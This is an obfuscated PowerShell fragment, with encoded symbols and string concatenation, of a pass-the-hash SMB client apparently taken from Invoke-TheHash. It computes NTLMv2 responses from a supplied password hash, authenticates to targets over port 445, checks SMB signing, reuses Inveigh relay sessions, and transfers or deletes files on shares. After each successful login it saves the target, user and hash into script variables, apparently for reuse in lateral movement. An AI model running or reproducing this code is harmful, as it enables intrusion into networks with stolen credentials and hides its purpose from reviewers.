    [Byte[]]wB69ASN_length_1 = ([System.BitConverter]::GetBytes(wB69NTLMResponse.Length + 12))[1,0]

    [Byte[]]wB69ASN_length_2 = ([System.BitConverter]::GetBytes(wB69NTLMResponse.Length + 8))[1,0]

    [Byte[]]wB69ASN_length_3 = ([System.BitConverter]::GetBytes(wB69NTLMResponse.Length + 4))[1,0]


    wB69NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary

    wB69NTLMSSPAuth.Add(NDckASNIDNDck,[Byte[]](0xa1,0x82))

    wB69NTLMSSPAuth.Add(NDckASNLengthNDck,wB69ASN_length_1)

    wB69NTLMSSPAuth.Add(NDckASNID2NDck,[Byte[]](0x30,0x82))

    wB69NTLMSSPAuth.Add(NDckASNLength2NDck,wB69ASN_length_2)

    wB69NTLMSSPAuth.Add(NDckASNID3NDck,[Byte[]](0xa2,0x82))

    wB69NTLMSSPAuth.Add(NDckASNLength3NDck,wB69ASN_length_3)

    wB69NTLMSSPAuth.Add(NDckNTLMSSPIDNDck,[Byte[]](0x04,0x82))

    wB69NTLMSSPAuth.Add(NDckNTLMSSPLengthNDck,wB'+'69NTLMSSP_length)

    wB69NTLMSSPAuth.Add(NDckNTLMResponseNDck,wB69NTLMResponse)


    return wB69NTLMSSPAuth

}


function Get-UInt16DataLength

{

    param ([Int]wB69Start,[Byte[]]wB69Data)


    wB69data_length = [System.BitConverter]::ToUInt16(wB69Data[wB69Start..(wB69Start + 1)],0)


    return wB69data_length

}


if(wB69Mod'+'ify -and wB69Action -eq utH9PututH9 -and wB69Source -isnot [Byte[]])

{

    wB69output_message = NDck[-] Source must be a byte array when using -ModifyNDck

    wB69startup_error = wB69true

}

elseif((!wB69Modify -and wB69Source -isnot [String]) -or (wB69Modify -and wB69Action -ne utH9PututH9 -and wB69Source -isnot [String]))

{

    wB69output_message = NDck[-] Source must be a stringNDck

    wB69startup_error = wB69true

}

elseif(wB69Action -eq utH9DeleteutH9 -and !wB69Source.StartsWith(NDck9e09e0NDck))

{

    wB69output_message = NDck[-] Source must be a UNC file pathNDck

    wB69startup_error = wB69true

}

elseif(wB69Source -is [String])

{

    wB69source = wB69Source.Replace(utH9.9e0utH9,utH9utH9)

}


if(wB69PSBoundParameters.ContainsKey(utH9SessionutH9))

{

    wB69inveigh_session = wB69true

}


if(wB69PSBoundParameters.ContainsKey(utH9SessionutH9))

{


    if(!wB69Inveigh)

    {

     '+'   Write-Output NDck[-] Inveigh Relay session not foundNDck

        wB69startup_error = wB69true

    }

    elseif(!wB69inveigh.session_socket_table[wB69session].Connected)

    {

        Write-Output NDck[-] Inveigh Relay session not connectedNDck

        wB69startup_error = wB69true

    }


}


wB69destination = wB69Destination.Replace(utH9.9e0utH9,utH9utH9)


if(wB69hash -like NDck*:*NDck)

{

    wB69hash = wB69hash.SubString((wB69hash.IndexOf(NDck:NDck) + 1),32)

}


if(wB69Domain)

{

    wB69output_username = wB69Domain + NDck9e0NDck + wB69Username

}

else

{

    wB69output_username = wB69Username

}


wB69process_ID = [System.Diagnostics.Process]::GetCurrentProcess() uOva Select-Object -expand id

wB69process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(wB69process_ID))

[Byte[]]wB69process_ID = wB69process_ID.Split(NDck-NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}


if(!wB69inveigh_session)

{

    wB69client = New-Object System.Net.Sockets.TCPClient

    wB69client.Client.ReceiveTimeout = 30000

}


wB69action_step = 0


if(wB69Action -ne utH9PututH9)

{

    wB69source = wB69source.Replace(utH99e09e0utH9,utH9utH9)

    wB69source_array = wB69source.Split(utH99e0utH9)

    wB69target = wB69source_array[0]

    wB69share = wB69source_array[1]

    wB69source_subdirectory_array = wB69source.ToCharArray()

    [Array]::Reverse(wB69source_subdirectory_array)

    wB69source_file = -join(wB69source_subdirectory_array)

    wB69source_file = wB69source_file.SubString(0,wB69source_file.IndexOf(utH99e0utH9))

    wB69source_file_array = wB69source_file.ToCharArray()

    [Array]'+'::Reverse(wB69source_file_array)

    wB69source_file = -join(wB69source_file_array)

    wB69target_share = NDck9e09e0wB69target9e0wB69shareNDck

}


switch(wB69Action)

{


    utH9GetutH9

    {


        if(!wB69Modify)

        {


            if(wB69destination -and wB69destination -like utH9*9e0*utH9)

            {

                wB69destination_file_array = wB69destination.ToCharArray()

                [Array]::Reverse(wB69destination_file_array)

       '+'         wB69destination_file = -join(wB69destination_file_array)

                wB69destination_file = wB69destination_file.SubString(0,wB69destination_file.IndexOf(utH99e0utH9))

                wB69destination_file_array = wB69destination_file.ToCharArray()

                [Array]::Reverse(wB69destination_file_array)

                wB69destination_file = -join(wB69destination_file_array)

                wB69destin'+'ation_path = wB69destination

            }

            elseif(wB69destination)

            {


                if(Test-Path (Join-Path wB69PWD wB69destination))

                {

                    wB69output_message = NDck[-] Destination file already existsNDck

                    wB69startup_error = wB69true

                }

                else

                {

                    wB69destination_path = Join-Path wB69PWD wB69destination

                }

               

            }

            else

            {


                if(Test-Path (Join-Path wB69PWD wB69source_file))

                {

                    wB69output_message = NDck[-] Destination file already existsNDck

                    wB69startup_error = wB69true

                }

                else

                {

                    wB69destination_path = Join-Path wB69PWD wB69source_file

                }


            }


        }

        else

        {

            wB69file_memory = New-Object System.Collections.ArrayList

        }


    }


    utH9PututH9

    {


        if(!wB69Modify)

        {


            if(wB69source -notlike utH9*9e0*utH9)

            {

                wB69source = Join-Path wB69PWD wB69source

            }


            if(Test-Path wB69source)

            {

                [Int64]wB69source_file_size = (Get-Item wB69source).Length

                wB69source_file = wB69source


                if(wB69source_file_size -gt 65536)

                {

                    wB69source_file_size_quotient = [Math]::Truncate(wB69source_file_size / 65536)

                    wB69source_file_size_remainder = wB69source_file_size % 65536

                    wB69source_file_buffer_size = 65536

                }

                else

                {

                    wB69source_file_buffer_size = wB69source_file_size

                }


                wB69source_file_properties = Get-ItemProperty -path wB69source_file

                wB69source_file_creation_time = wB69source_file_properties.CreationTime.ToFileTime()

                wB69source_file_creation_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(wB69source_file_creation_time))

                wB69source_file_creation_time = wB69source_file_creation_time.Split(NDck-NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}

                wB69source_file_last_access_time = wB69source_file_properties.LastAccessTime.ToFileTime()

                wB69source_file_last_access_time '+'= [System.BitConverter]::ToString([System.BitConverter]::GetBytes(wB69source_file_last_access_time))

                wB69source_file_last_access_time = wB69source_file_last_access_time.Split(NDck-NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}

                wB69sour'+'ce_file_last_write_time = wB69source_file_properties.LastWriteTime.ToFileTime()

                wB69source_file_last_write_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(wB69source_file_last_write_time))

                wB69source_file_last_write_time = wB69source_file_last_write_time.Split(NDck-NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}

                wB69source_file_last_change_time = wB69source_file_last_write_time

                wB69source_file_buffer = new-object byte[] wB69source_file_buffer_size

                wB69source_file_stream = new-object IO.FileStream(wB69source_file,[System.IO.FileMode]::Open)

                wB69source_file_binary_reader = new-object IO.BinaryReader(wB69source_file_stream)

            }

            else

            {

                wB69output_message = NDck[-] File not foundNDck

                wB69startup_error = wB69true

            }


        }

        else

        {

            [Int64]wB69source_file_size = wB69Source.Count


            if(wB69source_file_size -gt 65536)

            {

                wB69source_file_size_quotient = [Math]::Truncate(wB69source_file_size / 65536)

                wB69source_file_size_remainder = wB69source_file_size % 65536

                wB69source_file_buffer_size = 65536

            }

            else

            {

                wB69source_fi'+'le_buffer_size = wB69source_file_size

            }

      

        }


        wB69destination = wB69destination.Replace(utH99e09e0u'+'tH9,utH9utH9)

        wB69destination_array = wB69destination.Split(utH99e0utH9)

        wB69target = wB69destination_array[0]

        wB69share = wB69destination_array[1]

        wB69destination_file_array = wB69destination.ToCharArray()

        [Array]::Reverse(wB69destination_file_array)

        wB69destination_file = -join(wB69destination_file_array)

        wB69destination_file = wB69destination_file.SubString(0,wB69destination_file.IndexOf(utH99e0utH9))

        wB69destination_file_array = wB69destination_file.ToCharArray()

        [Array]::Reverse(wB69destination_file_array)

        wB69destination_file = -join(wB69destination_file_array)

    }


}


if(wB69Action -ne utH9PututH9)

{


    if(wB69source_array.Count -gt 2)

    {

        wB69share_subdirectory = wB69source.Substring(wB69target.Length + wB69share.Length + 2)

    }


}

else

{

    

    if(wB69destination_array.Count -gt 2)

    {

        wB69share_subdirectory = wB69destination.Substring(wB69target.Length + wB69share.Length + 2)

    }


}


if(wB69share_subdirectory -and wB69share_subdirectory.EndsWith(utH99e0utH9))

{

    wB69share_subdirectory = wB69share_subdirectory.Substring(0,wB69share_subdirectory.Length - 1)

}


if(!wB69startup_error -and !wB69inveigh_session)

{


    try

    {

        wB69client.Connect(wB69target,NDck445NDck)

    }

    catch

    {

        wB69output_message = NDck[-] wB69target did not respondNDck

    }


}


if(wB69client.Connected -or (!wB69startup_error -and wB69inveigh.session_socket_table[wB69session].Connected))

{

    

    wB69client_receive = New-Object System.Byte[] 81920


    if(!wB69inveigh_session)

    {

    '+'    wB69client_stream = wB69client.GetStream()

        

        if(wB69SMB_version -eq utH9SMB2.1utH9)

        {

            wB69stage = utH9NegotiateSMB2utH9

        }

        else

        {

            wB69stage = utH9NegotiateSMButH9

        }


        while(wB69stage -ne utH9ExitutH9)

        {


            try

            {

            

                switch (wB69stage)

                {


                    utH9NegotiateSMButH9

                    {          

                        wB69packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff wB69process_ID 0x00,0x00       

                        wB69packet_SMB_data = New-PacketSMBNegotiateProtocolRequest wB69SMB_version

                   '+'     wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service

                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data


                        try

                        {

                            wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                            wB69client_stream.Flush()    

                            wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                            if([System.BitConverter]::ToString(wB69client_receive[4..7]) -eq utH9ff-53-4d-42utH9)

                            {

                                wB69SMB_version = utH9SMB1utH9

                                wB69stage = utH9NTLMSSPNegotiateutH9


                                if([System.BitConverter]::ToString(wB69client_receive[39]) -eq utH90futH9)

                                {


                                    if(wB69signing_check)

                                    {

                                        Write-Output NDck[+] SMB signing is required on wB69TargetNDck

                                        wB69stage = utH9ExitutH9

                                    }

             '+'                       else

                                    {    

                                        Write-Verbose NDck[+] SMB signing is requiredNDck

                                        wB69SMB_signing = wB69true

                                        wB69session_key_length = 0x00,0x00

                                        wB69negotiate_flags = 0x15,0x82,0x08,0xa0

                                    }


                                }

                                else

                                {


                                    if(wB69s'+'igning_check)

                                    {

                                        Write-Output NDck[+] SMB signing is not required on wB69TargetNDck

                                        wB69stage = utH9ExitutH9

                                    }

                                    else

                                    {    

                                        wB69SMB_signing = wB69false

                                        wB69session_key_length = 0x00,0x00

                                        wB69negotiate_flags = 0x05,0x82,0x08,0xa0

                                    }


                                }


                            }
'+'
                            else

                            {

                                wB69stage = utH9NegotiateSMB2utH9


                                if([System.BitConverter]::ToString(wB69client_receive[70]) -eq utH903utH9)

                                {


                                    if(wB69signing_check)

                                    {

                                        Write-Output NDck[+] SMB signing is required on wB69TargetNDck

                                        wB69stage = utH9ExitutH9

                                    }

                                    else

                                    {   


                                        if(!wB69SMB_signing)

                                        {

                                            Write-Verbose NDck[+] SMB signing is requiredNDck

                                        }


                                        wB69SMB_signing = wB69true

                                        wB69session_key_length = 0x00,0x00

                            '+'            wB69negotiate_flags = 0x15,0x82,0x08,0xa0

                                    }


                                }

                                else

                                {


                                    if(wB69signing_check)

                                    {

                                        Write-Output NDck[+] SMB signing is not required on wB69TargetNDck

                                        wB69stage = utH9ExitutH9

                                    }

                                    else

                                    {    

                                        wB69SMB_signing = wB69false

                                        wB69session_key_length = 0x00,0x00

                                        wB69negotiate_flags = 0x05,0x80,0x08,0xa0

                                    }


                                }


                            }


                        }

                        catch

                        {


                            if(wB69_.Exception.Message -like utH9Excep'+'tion calling NDckReadNDck with NDck3NDck argument(s): NDckUnable to read data from the transport connection: An existing connection was forcibly closed by the remote host.NDckutH9)

                            {

                                Write-Output NDck[-] '+'SMB1 negotiation failedNDck

                                wB69negoitiation_failed = wB69true

                                wB69stage = utH9ExitutH9

                            }


                        }


                    }


                    utH9NegotiateSMB2utH9

                    {


                        if(wB69SMB_version -eq utH9SMB2.1utH9)

'+'                        {

                            wB69message_ID = 0

                        }

                        else

                        {

                            wB69message_ID = 1

                        }


                        wB69tree_ID = 0x00,0x00,0x00,0x00

                        wB69session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

                        wB69packet_SMB_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 wB69false wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB_data = New-PacketSMB2NegotiateProtocolRequest

'+'                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packe'+'t_SMB_header

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service

                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()    

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9NTLMSSPNegotiateutH9


                        if([System.BitConverter]::ToString(wB69client_receive[70]) -eq utH903utH9)

                        {


                            if(wB69signing_check)

                            {

                                Write-Output NDck[+] SMB signing is required on wB69targetNDck

                                wB69stage = utH9ExitutH9

                            }

                            else

                            {


                                if(!wB69SMB_signing)

                                {

                                    Write-Verbose NDck[+] SMB signing is requiredNDck

                                }


                                wB69SMB_signing = wB69true

                                wB69session_key_length = 0x00,0x00

                                wB69negotiate_flags = 0x15,0x82,0x08,0xa0

                            }


                        }

                        else

                        {


                            if(wB69signing_check)

                            {

                                Write-Output NDck[+] SMB signing is not required on wB69targetNDck

                                wB69stage = utH9ExitutH9

                            }

                            else

                            {

                                wB69SMB_signing = wB69false

                                wB69session_key_length = 0x00,0x00

                                wB69negotiate_flags = 0x05,0x80,0x08,0xa0

                            }


                        }


                    }

                        

                    utH9NTLMSSPNegotiateutH9

                    { 

                        

                        if(wB69SMB_version -eq utH9SMB1utH9)

                        {

                            wB69packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff wB69process_ID 0x00,0x00


                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            }


                            wB69packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate wB69negotiate_flags

                            wB69SMB_head'+'er = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                            wB69NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary wB69packet_NTLMSSP_negotiate       

                            wB69packet_SMB'+'_data = New-PacketSMBSessionSetupAndXRequest wB69NTLMSSP_negotiate

                            wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service

                            wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data

                        }

                        else

                        {

                            wB69message_ID++

                            wB69packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 wB69false wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                            wB69packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate wB69negotiate_flags 0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                            wB69NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary wB69packet_NTLMSSP_'+'negotiate       

                            wB69packet_SMB_data = New-PacketSMB2SessionSetupRequest wB69NTLMSSP_negotiate

                            wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service

                            wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data

                        }


                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()    

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9ExitutH9

                    }

                    

                }


            }

            catch

            {

                Write-Output NDck[-] wB69(wB69_.Exception.Message)NDck

                wB69negoitiation_failed = wB69true

            }


        }


        if(!wB69signing_check -and !wB69negoitiation_failed)

        {

            wB69NTLMSSP = [System.BitConverter]::ToString(wB69client_receive)

            wB69NTLMSSP = wB69NTLMSSP -replace NDck-NDck,NDckNDck

            wB69NTLMSSP_index = wB69NTLMSSP.IndexOf(NDck4E544C4D53535000NDck)

            wB69NTLMSSP_bytes_index = wB69NTLMSSP_index / 2

            wB69domain_length = Get-UInt16DataLength (wB69NTLMSSP_bytes_index + 12) wB69client_receive

            wB69target_length = Get-UInt16DataLength (wB69NTLMSSP_bytes_index + 40) wB69client_receive

            wB69session_ID = wB69client_receive[44..51]

            wB69NTLM_challenge = wB69client_receive[(wB69NTLMSSP_bytes_i'+'ndex + 24)..(wB69NTLMSSP_bytes_index + 31)]

            wB69target_details = wB69client_receive[(wB69NTLMSSP_bytes_index + 56 + wB69domain_length)..(wB69NTLMSSP_bytes_index + 55 + wB69domain_length + wB69target_length)]

            wB69target_time_bytes = wB69target_details[(wB69target_details.Length - 12)..(wB69target_details.Length - 5)]

            wB69NTLM_hash_bytes = (&{for (wB69i = 0;wB69i -lt wB69hash.Length;wB69i += 2){wB69hash.SubString(wB69i,2)}}) -join NDck-NDck

            wB69NTLM_hash_bytes = wB69NTLM_hash_bytes.Split(NDck-NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}

            wB69auth_hostname = (Get-ChildItem -path env:computername).Value

            wB69auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes(wB69auth_hostname)

            wB69auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes(wB69Domain)

            wB69auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes(wB69username)

            wB69auth_domain_length = [System.BitConverter]::GetBytes(wB69auth_domain_bytes.Length)[0,1]

            wB69auth_domain_length = [System.BitConverter]::GetBytes(wB69auth_domain_bytes.Length)[0,1]

            wB69auth_username_length = [System.BitConverter]::GetBytes(wB69auth_username_bytes.Length)[0,1]

            wB69auth_hostname_length = [System.BitConverter]::GetBytes(wB69auth_hostname_bytes.Length)[0,1]

            wB69auth_domain_offset = 0x40,0x00,0x00,0x00

            wB69auth_username_offset = [System.BitConverter]::GetBytes(wB69auth_domain_bytes.Length + 64)

            wB69auth_hostname_offset = [System.BitConverter]::GetBytes(wB69auth_domain_bytes.Length + wB69auth_username_bytes.Length + 64)

            wB69auth_LM_offset = [System.BitConverter]::GetBytes(wB69auth_domain_bytes.Length + wB69auth_username_bytes.Length + wB69auth_hostname_bytes.Length + 64)

            wB69auth_NTLM_offset = [System.BitConverter]::GetBytes(wB69auth_domain_bytes.Length + wB69auth_username_bytes.Length + wB69auth_hostname_bytes.Length + 88)

            wB69HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5

            wB69HMAC_MD5.key = wB69NTLM_hash_bytes

            wB69username_and_target = wB69username.ToUpper()

            wB69username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes(wB69username_and_target)

            wB69username_and_target_bytes += wB69auth_domain_bytes

            wB69NTLMv2_hash = wB69HMAC_MD5.ComputeHash(wB69username_and_target_bytes)

            wB69client_challenge = [String](1..8 uOva ForEach-Object {NDck{0:X2}NDck -f (Get-Random -Minimum 1 -Maximum 255)})

            wB69client_challenge_bytes = wB69client_challenge.Split(NDck NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}


            wB69security_blob_bytes = 0x01,0x01,0x00,0x00,

                                    0x00,0x00,0x00,0x00 +

                                    wB69target_time_bytes +

                                    wB69client_challenge_bytes +

                                    0x00,0x00,0x00,0x00 +

                                    wB69target_details +

                                    0x00,0x00,0x00,0x00,

                                    0x00,0x00,0x00,0x00


            wB69server_challenge_and_security_blob_bytes = wB69NTLM_challenge + wB69security_blob_bytes

            wB69HMAC_MD5.key = wB69NTLMv2_hash

            wB69NTLMv2_response = w'+'B69HMAC_MD5.ComputeHash(wB69server_challenge_and_security_blob_bytes)


            if(wB69SMB_signing)

            {

                wB69session_base_key = wB69HMAC_MD5.ComputeHash(wB69NTLMv2_response)

                wB69session_key = wB69session_base_key

                wB69HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256

                wB69HMAC_SHA256.key = wB69session_key

            }


            wB69NTLMv2_response = wB69NTLMv2_response + wB69security_blob_bytes

            wB69NTLMv2_response_length = [System.BitConverter]::GetBytes(wB69NTLMv2_response.Length)[0,1]

            wB69session_key_offset = [System.BitConverter]::GetBytes(wB69auth_domain_bytes.Length + wB69auth_username_bytes.Length + wB69auth_hostname_bytes.Length + wB69NTLMv2_response.Length + 88)


            wB69NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,

                                    0x03,0x00,0x00,0x00,

                                    0x18,0x00,

                                    0x18,0x00 +

                                    wB69auth_LM_offset +

                                    wB69NTLMv2_response_length +

                                    wB69NTLMv2_response_length +

                                    wB69auth_NTLM_offset +

                                    wB69auth_domain_length +

                        '+'            wB69auth_domain_length +

                                    wB69auth_domain_offset +

                                    wB69auth_username_length +

                                    wB69auth_username_length +

                                    wB69auth_username_offset +

                                    wB69auth_hostname_length +

                                    wB69auth_hostname_length +

                                    wB69auth_hostname_offset +

                                    wB69s'+'ession_key_length +

                                    wB69session_key_length +

                                    wB69session_key_offset +

                                    wB69negotiate_flags +

                                    wB69auth_domain_bytes +

                                    wB69auth_username_bytes +

                                    wB69auth_hostname_bytes +

                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,

                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +

                                    wB69NTLMv2_response


            if(wB69SMB_version -eq utH9SMB1utH9)

            {

                wB69SMB_user_ID = wB69client_receive[32,33]

                wB69packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff wB69process_ID wB69SMB_user_ID


                if(wB69SMB_signing)

                {

                    wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                }


                wB69packet_SMB_header[NDckUserIDNDck] = wB69SMB_user_ID

                wB69packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth wB69NTLMSSP_response

                wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                wB69NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary wB69packet_NTLMSSP_negotiate      

                wB69packet_SMB_data = New-PacketSMBSessionSetupAndXRequest wB69NTLMSSP_negotiate

                wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service

                wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data

            }

            else

            {

                wB69message_ID++

                wB69packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x00,0x00 wB69false wB69message_ID  wB69process_ID wB69tree_ID wB69session_ID

           '+'     wB69packet_NTLMSSP_auth = New-PacketNTLMSSPAuth wB69NTLMSSP_response

                wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                wB69NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary wB69packet_NTLMSSP_auth        

                wB69packet_SMB_data = New-PacketSMB2SessionSetupRequest wB69NTLMSSP_auth

                wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service

                wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data

            }


            try

            {

                wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                wB69client_stream.Flush()

                wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                if(wB69SMB_version -eq utH9SMB1utH9)

                {


                    if([System.BitConverter]::ToString(wB69client_receive[9..12]) -eq utH900-00-00-00utH9)

                    {

						wB69script:tmpip = wB69Target

						wB69script:tmpuser = wB69Username

						wB69script:tmphash = wB69hash

                        Write-Verbose NDck[+] wB69output_username successfully authenticated on wB69TargetNDck

                        Write-Output NDck[-] SMB1 is only supported with signing check and authenticationNDck

                        wB69login_successful = wB69false

                    }

                    else

                    {

                        Write-Output NDck[!] wB69output_username failed to authenticate on wB69TargetNDck

                        wB69login_successful = wB69false

                    }


                }

                else

                {

                    if([System.BitConverter]::ToString(wB69client_receive[12..15]) -eq utH900-00-00-00utH9)

                    {

						wB69script:tmpip = wB69Target

						wB69script:tmpuser = wB69Username

						wB69script:tmphash = wB69hash

                        Write-Verbose NDck[+] wB69output_username successfully authenticated on wB69TargetNDck

                        wB69login_successful = wB69true

                    }

                    else

                    {

                        Write-Output NDck[!] wB69output_username failed to authenticate on wB69TargetNDck

                        wB69login_successful = wB69false

                    }


                }


            }

            catch

            {

                Write-Output NDck[-] wB69(wB69_.Exception.Message)NDck

                wB69login_successful = wB69false

            }


        }


    }


    try

    {


        if(wB69login_successful -or wB69inveigh_session)

        {


            if(wB69inveigh_session)

            {


                if(wB69inveigh_session -and wB69inveigh.session_lock_table[wB69session] -eq utH9lockedutH9)

                {

                    Write-Output NDck[*] Pausing due to Inveigh Relay session lockNDck

                    Start-Sleep -s 2

                }


                wB69inveigh.session_lock_table[wB69session] = utH9lockedutH9

                wB69client = wB69inveigh.session_socket_table[wB69session]

                wB69client_stream = wB69client.GetStream()

                wB69session_ID = wB69inveigh.session_table[wB69session]

                wB69message_ID =  wB69inveigh.session_message_ID_table[wB69session]

                wB69tree_ID = 0x00,0x00,0x00,0x00

                wB69SMB_signing = wB69false

            }


            wB69path = NDck9e09e0NDck + wB69Target + NDck9e0IPCwB69NDck

            wB69path_bytes = [System.Text.Encoding]::Unicode.GetBytes(wB69path)

            wB69directory_list = New-Object System.Collections.ArrayList

            wB69stage = utH9TreeConnectutH9


            while (wB69stage -ne utH9ExitutH9)

            {


                switch(wB69stage)

                {

            

                    utH9CloseRequestutH9

                    {


                        if(!wB69file_ID)

                        {

                            wB69file_ID = wB69client_receive[132..147]

                        }


                        wB69message_ID++

                        wB69packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB2_data = New-PacketSMB2CloseRequest wB69file_ID

                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69file_ID = utH9utH9


                        if(wB69directory_list.Count -gt 0 -and wB69Action -eq utH9RecurseutH9)

                        {

                            wB69file = wB69directory_list[0]

                            wB69root_directory = wB69file + 0x5c,0x00

                            wB69create_request_extra_info = 1

                            wB69stage = utH9CreateRequestutH9


                            if(wB69root_directory.Count -gt 2)

                            {

                                wB69root_directory_extract = [System.BitConverter]::ToString(wB69root_directory)

                                wB69root_directory_extract = wB69root_directory_extract -replace NDck-00NDck,NDckNDck


                                if(wB69root_directory.Length -gt 2)

                                {

                                    wB69root_directory_extract = wB69root_directory_extract.Split(NDck-NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}

